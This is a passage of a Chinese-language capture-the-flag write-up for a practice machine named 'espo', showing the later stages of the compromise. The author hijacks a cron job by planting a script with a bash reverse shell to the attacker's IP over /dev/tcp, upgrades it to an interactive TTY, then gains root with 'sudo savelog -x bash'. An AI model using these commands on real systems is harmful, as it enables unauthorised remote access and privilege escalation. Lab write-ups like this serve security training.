2025/01/08 06:58:01 CMD: UID=0     PID=2071   | /usr/sbin/cron -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2073   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2075   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2077   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php > /dev/null 2>&1 
2025/01/08 06:58:01 CMD: UID=1000  PID=2076   | /bin/sh -c /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2078   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2079   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2080   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2081   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2082   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2083   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2084   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2085   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2086   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2087   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2088   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2089   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2090   | /bin/bash /home/mandie/copyPics 
^CExiting program... (interrupt)

```

有定时任务用`UID1000`的用户执行`/home/mandie/copyPics`，`copyPics`的内容

```bash
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2>/dev/null
    done
done
```

实现了从一个目录 `/var/shared_medias` 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在`/var/shared_medias`中创建一个`copyPics`文件，并在里面加点料

```bash
www-data@espo:/tmp$ ls -la /var/shared_medias
total 7792
drwxrwxrwt  2 root root    4096 Jan 24  2024 .
drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg
-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg
-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg
-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg
-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg
-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg
-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4
www-data@espo:/tmp$ cd /var/shared_medias
www-data@espo:/var/shared_medias$ cp /home/mandie/copyPics .
www-data@espo:/var/shared_medias$ nano copyPics 
www-data@espo:/var/shared_medias$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2>/dev/null
    done
done


bash -c "bash -i >& /dev/tcp/192.168.205.141/9999 0>&1"
```

让子弹飞会

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
mandie@espo:~$ id
uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)

```

获得一下稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

尝试提权

```bash
mandie@espo:~$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog
mandie@espo:~$ /usr/bin/savelog -h
Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
        -m mode    - chmod log files to mode
        -u user    - chown log files to user
        -g group   - chgrp log files to group
        -c cycle   - save cycle versions of the logfile (default: 7)
        -r rolldir - use rolldir instead of . to roll files
        -C         - force cleanup of cycled logfiles
        -d         - use standard date for rolling
        -D         - override date format for -d
        -t         - touch file
        -l         - don't compress any log files (default: compress)
        -p         - preserve mode/user/group of original file
        -j         - use bzip2 instead of gzip
        -J         - use xz instead of gzip
        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)
        -x script  - invoke script with rotated log file in $FILE
        -n         - do not rotate empty files
        -q         - suppress rotation message
        file       - log file names

# 翻译
用法： savelog [-m 模式] [-u 用户] [-g 组] [-t] [-c 循环] [-p]
             [-j][-C][-d][-l][-r 滚动目录][-n][-q] 文件 ...
        -m mode - chmod 日志文件模式
        -u 用户 - 将日志文件上传到用户
        -g group - 要分组的 chgrp 日志文件
        -c cycle - 保存日志文件的循环版本（默认值：7）
        -r rolldir - 使用 rolldir 而不是 .滚动文件
        -C - 强制清理循环的日志文件
        -d - 使用标准日期进行滚动
        -D - 覆盖 -d 的日期格式
        -t - 触摸文件
        -l - 不压缩任何日志文件（默认：compress）
        -p - 保留原始文件的模式/用户/组
        -j - 使用 bzip2 而不是 gzip
        -J - 使用 xz 而不是 gzip
        -1 ..-9 - 压缩强度或内存使用率（默认值：9，xz 除外）
        -x script - 使用$FILE中旋转的日志文件调用脚本
        -n - 不旋转空文件
        -q - 禁止旋转消息
        file - 日志文件名

```

`-x`我们比较感兴趣，试试行不行

```bash
mandie@espo:~$ find / -name "*.log" 2>/dev/null
/var/www/html/data/logs/espo-2023-12-04.log
/var/www/html/data/logs/espo-2025-01-08.log
/var/www/html/data/logs/espo-2024-01-24.log
/var/log/alternatives.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/dpkg.log
/var/log/php8.2-fpm.log
/var/lib/mysql/ddl_recovery-backup.log
/var/lib/mysql/ddl_recovery.log
mandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log
sudo: unable to resolve host espo: Name or service not known
root@espo:/home/mandie# id
uid=0(root) gid=0(root) groups=0(root)
```

成功提权

# 5.后话

看了一下`HGBE`大佬的wp，才发现群主`ll104567`发现了一个定时任务直接获取 root

![image](https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d)

甚至在`www-data`权限的时候就可以直接提权到`root`
![C4](https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95)